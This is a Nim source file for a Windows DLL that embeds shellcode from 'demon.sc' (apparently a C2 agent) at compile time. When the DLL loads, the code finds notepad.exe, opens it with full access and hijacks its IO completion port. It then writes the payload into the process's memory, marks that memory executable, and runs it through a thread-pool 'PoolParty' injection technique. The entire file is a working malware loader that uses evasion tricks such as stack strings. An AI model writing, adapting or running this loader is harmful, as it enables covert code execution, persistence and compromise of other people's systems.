import winim/lean

import instance , undefined_ref
import nimpool/[nimpool, ioinject]
import utils/[stackstr, stdio]
import utils/stdlib/[stringh]

# Read in shellcode at compile time
const 
  buf   = staticRead("demon.sc")

proc getProcessIdViaNtQueryFunc(szProcessName: pointer, pdwProcessId: var DWORD, phProcess: ptr HANDLE = cast[ptr HANDLE](0)): bool =
  var 
    uArrayLength: ULONG
    status: NTSTATUS
    pValueToFree: PVOID
    hProcess: HANDLE

  status = ninst.Win32.NtQuerySystemInformation(systemProcessInformation, NULL, cast[ULONG](NULL), uArrayLength.addr)
  if status != STATUS_INFO_LENGTH_MISMATCH:
    return false
  
  var systemProcInfo = cast[PVOID](ninst.Win32.HeapAlloc(ninst.Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, uArrayLength))
  pValueToFree = systemProcInfo

  if ninst.Win32.NtQuerySystemInformation(systemProcessInformation, cast[PVOID](systemProcInfo), uArrayLength, cast[PULONG](NULL)) != 0:
    return false

  while true:
    var instance = cast[PSYSTEM_PROCESS_INFORMATION](systemProcInfo)
    # The first Entry of PSYSTEM_PROCESS_INFORMATION will always be null, we need to handle it.
    if (cast[int](instance.ImageName.Buffer) != 0) and (cmpStrAToStrW(szProcessName, instance.ImageName.Buffer) == 0):
      pdwProcessId = cast[DWORD](instance.UniqueProcessId)
      hProcess = ninst.Win32.OpenProcess(PROCESS_ALL_ACCESS, FALSE, cast[DWORD](instance.UniqueProcessId))
      if cast[int](phProcess) != 0:
        phProcess[] = hProcess
      break
    if instance.NextEntryOffset == 0:
      break
    systemProcInfo = cast[PSYSTEM_PROCESS_INFORMATION](cast[uint](systemProcInfo) + cast[uint](instance.NextEntryOffset))

  discard ninst.Win32.HeapFree(ninst.Win32.GetProcessHeap(), 0, pValueToFree)

  if pdwProcessId == 0:
    return false
  return true

proc writePayloadIntoProcess*(hProcess: HANDLE, pPayload: pointer, szPayload: int, pRemoteAddress: ptr PVOID): bool =
  var 
    bytesWritten: SIZE_T
    dwOldProtection: DWORD

  let remote = ninst.Win32.VirtualAllocEx(hProcess, NULL, szPayload, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remote == nil:
    return false

  if (ninst.Win32.WriteProcessMemory(hProcess, remote, pPayload, szPayload, bytesWritten.addr) == 0) or (bytesWritten != szPayload):
    return false

  if ninst.Win32.VirtualProtectEx(hProcess, remote, szPayload, PAGE_EXECUTE_READ, dwOldProtection.addr) == 0:
    return false

  pRemoteAddress[] = remote
  return true

proc doPoolPartyTpDirect(pBuf: pointer, szBuf: int): bool =
  var 
    target {.stackStringA.} = "notepad.exe"
    pid: DWORD
    hProc: HANDLE
    rPayload: PVOID
  if getProcessIdViaNtQueryFunc(target[0].addr, pid, hProc.addr):
    PRINTA("[+] Opened Handle [%i] to PID [%i]\n", cast[int](hProc), cast[int](pid))
  else:
    PRINTA("[-] Failed to Open Handle [%i] to PID [%i]\n", cast[int](hProc), cast[int](pid))

  let hHiJack = hijackProcessIoPort(hProc)
  PRINTA("[+] HijackedHandle [%i]\n", cast[int](hHiJack))

  if writePayloadIntoProcess(hProc, pBuf, szBuf, rPayload.addr):
    PRINTA("[+] Payload Successfully written to %p\n", rPayload)

  # Do injection
  return injectViaTpDirect(hProc, rPayload, hHiJack)

proc injectViaThreadpool() = 
  var 
    pBuf = buf.cstring
    szBuf = buf.len

  discard doPoolPartyTpDirect(pBuf, szBuf)


proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReason: LPVOID): BOOL {.stdcall, exportc:"DLLMain", dynlib.} =
  discard ninst.init()

  if fdwReason == DLL_PROCESS_ATTACH:
    injectViaThreadpool()
  return true




